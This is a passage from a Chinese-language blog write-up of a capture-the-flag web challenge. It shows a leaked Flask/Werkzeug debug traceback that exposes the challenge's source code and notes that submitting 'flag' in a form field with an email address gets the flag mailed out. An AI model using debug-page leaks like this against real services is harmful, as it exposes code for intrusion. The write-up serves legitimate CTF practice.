before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()</span><br><span class="line">&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;     ^^^^^^^^^^^^^^^^^^^^^^^&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-140079071314704&quot;&gt;</span><br><span class="line">  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;&lt;/cite&gt;,</span><br><span class="line">      line &lt;em class=&quot;line&quot;&gt;855&lt;/em&gt;,</span><br><span class="line">      in &lt;code class=&quot;function&quot;&gt;dispatch_request&lt;/code&gt;&lt;/h4&gt;</span><br><span class="line">  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;and req.method == &amp;#34;OPTIONS&amp;#34;&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;):&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return self.make_default_options_response()&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;# otherwise dispatch to the handler for that endpoint&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]</span><br><span class="line">&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def full_dispatch_request(self) -&amp;gt; Response:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Dispatches the request and on top of that performs request&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;pre and postprocessing as well as HTTP exception catching and&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error handling.&lt;/pre&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-140079071314848&quot;&gt;</span><br><span class="line">  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/app/webapp.py&quot;&lt;/cite&gt;,</span><br><span class="line">      line &lt;em class=&quot;line&quot;&gt;26&lt;/em&gt;,</span><br><span class="line">      in &lt;code class=&quot;function&quot;&gt;submitted&lt;/code&gt;&lt;/h4&gt;</span><br><span class="line">  &lt;div class=&quot;source &quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;if request.method == &amp;#39;POST&amp;#39;:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;content = request.get_json()&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;sender = content.get(&amp;#39;email&amp;#39;)&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;messege = content.get(&amp;#39;messege&amp;#39;)&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;f.setSender(sender)&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;f.checkResponds(messege)</span><br><span class="line">&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;^^^^^^^^^^^^^^^^^^^^^^^^&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;else:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return &amp;#34;Post:Json Request Only&amp;#34;&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;return &amp;#34;Email Sent!&amp;#34;&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;@app.route(&amp;#34;/countdown&amp;#34;)&lt;/pre&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-140079071314992&quot;&gt;</span><br><span class="line">  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/app/floaty.py&quot;&lt;/cite&gt;,</span><br><span class="line">      line &lt;em class=&quot;line&quot;&gt;17&lt;/em&gt;,</span><br><span class="line">      in &lt;code class=&quot;function&quot;&gt;checkResponds&lt;/code&gt;&lt;/h4&gt;</span><br><span class="line">  &lt;div class=&quot;source &quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def setSender(self, email):&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.sendto = email&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;#Check Responds for flag or fake&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def checkResponds(self, responds):&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;if &amp;#34;flag&amp;#34; in responds:</span><br><span class="line">&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;   ^^^^^^^^^^^^^^^^^^&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;self.sendFlag()&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;else:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;self.sendFake()&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;#Send Flag if requested&lt;/pre&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">  &lt;blockquote&gt;TypeError: argument of type &amp;#39;NoneType&amp;#39; is not iterable</span><br><span class="line">&lt;/blockquote&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;plain&quot;&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">      This is the Copy/Paste friendly version of the traceback.</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;textarea cols=&quot;50&quot; rows=&quot;10&quot; name=&quot;code&quot; readonly&gt;Traceback (most recent call last):</span><br><span class="line">  File &amp;#34;/usr/local/lib/python3.12/site-packages/flask/app.py&amp;#34;, line 1488, in __call__</span><br><span class="line">    return self.wsgi_app(environ, start_response)</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &amp;#34;/usr/local/lib/python3.12/site-packages/flask/app.py&amp;#34;, line 1466, in wsgi_app</span><br><span class="line">    response = self.handle_exception(e)</span><br><span class="line">               ^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &amp;#34;/usr/local/lib/python3.12/site-packages/flask/app.py&amp;#34;, line 1463, in wsgi_app</span><br><span class="line">    response = self.full_dispatch_request()</span><br><span class="line">               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &amp;#34;/usr/local/lib/python3.12/site-packages/flask/app.py&amp;#34;, line 872, in full_dispatch_request</span><br><span class="line">    rv = self.handle_user_exception(e)</span><br><span class="line">         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &amp;#34;/usr/local/lib/python3.12/site-packages/flask/app.py&amp;#34;, line 870, in full_dispatch_request</span><br><span class="line">    rv = self.dispatch_request()</span><br><span class="line">         ^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &amp;#34;/usr/local/lib/python3.12/site-packages/flask/app.py&amp;#34;, line 855, in dispatch_request</span><br><span class="line">    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &amp;#34;/app/webapp.py&amp;#34;, line 26, in submitted</span><br><span class="line">    f.checkResponds(messege)</span><br><span class="line">  File &amp;#34;/app/floaty.py&amp;#34;, line 17, in checkResponds</span><br><span class="line">    if &amp;#34;flag&amp;#34; in responds:</span><br><span class="line">       ^^^^^^^^^^^^^^^^^^^</span><br><span class="line">TypeError: argument of type &amp;#39;NoneType&amp;#39; is not iterable</span><br><span class="line">&lt;/textarea&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;explanation&quot;&gt;</span><br><span class="line">  The debugger caught an exception in your WSGI application.  You can now</span><br><span class="line">  look at the traceback which led to the error.  &lt;span class=&quot;nojavascript&quot;&gt;</span><br><span class="line">  If you enable JavaScript you can also use additional features such as code</span><br><span class="line">  execution (if the evalex feature is enabled), automatic pasting of the</span><br><span class="line">  exceptions and much more.&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">        Brought to you by &lt;strong class=&quot;arthur&quot;&gt;DON&#x27;T PANIC&lt;/strong&gt;, your</span><br><span class="line">        friendly Werkzeug powered traceback interpreter.</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;pin-prompt&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">        &lt;h3&gt;Console Locked&lt;/h3&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">          The console is locked and needs to be unlocked by entering the PIN.</span><br><span class="line">          You can find the PIN printed out on the standard output of your</span><br><span class="line">          shell that runs the server.</span><br><span class="line">        &lt;form&gt;</span><br><span class="line">          &lt;p&gt;PIN:</span><br><span class="line">            &lt;input type=text name=pin size=14&gt;</span><br><span class="line">            &lt;input type=submit name=btn value=&quot;Confirm Pin&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;, line 1488, in __call__</span><br><span class="line">    return self.wsgi_app(environ, start_response)</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;, line 1466, in wsgi_app</span><br><span class="line">    response = self.handle_exception(e)</span><br><span class="line">               ^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;, line 1463, in wsgi_app</span><br><span class="line">    response = self.full_dispatch_request()</span><br><span class="line">               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;, line 872, in full_dispatch_request</span><br><span class="line">    rv = self.handle_user_exception(e)</span><br><span class="line">         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;, line 870, in full_dispatch_request</span><br><span class="line">    rv = self.dispatch_request()</span><br><span class="line">         ^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;, line 855, in dispatch_request</span><br><span class="line">    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/app/webapp.py&quot;, line 26, in submitted</span><br><span class="line">    f.checkResponds(messege)</span><br><span class="line">  File &quot;/app/floaty.py&quot;, line 17, in checkResponds</span><br><span class="line">    if &quot;flag&quot; in responds:</span><br><span class="line">       ^^^^^^^^^^^^^^^^^^^</span><br><span class="line">TypeError: argument of type &#x27;NoneType&#x27; is not iterable</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>反正大致就是messege字段填flag，然后找个邮箱来接flag：</p>
<p><img src="https://s2.loli.net/2024/03/24/EVFAPQbWtLODsdw.png" alt="image-20240324021144038"></p>
<p>彳亍：</p>
<p><img src="https://s2.loli.net/2024/03/24/ZchvLdn4UgmCxHa.png" alt="image-20240324021158937"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/03/25/texsaw2024/">http://example.com/2024/03/25/texsaw2024/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">Alex's blog~</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2025/01/29/%E8%A2%AB%E6%96%B0%E6%98%A5%E8%B5%9B%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E5%88%9B%E6%AD%BB%E4%BA%86/"><i class="fa fa-chevron-left">  </i><span>被新春赛的一道逆向创死了</span></a></div><div class="next-post pull-right"><a href="/2024/01/24/MSF-C2/"><span>msf-shikata_ga_nai编码分析与C2配置信息提取</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2025 By Alex</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>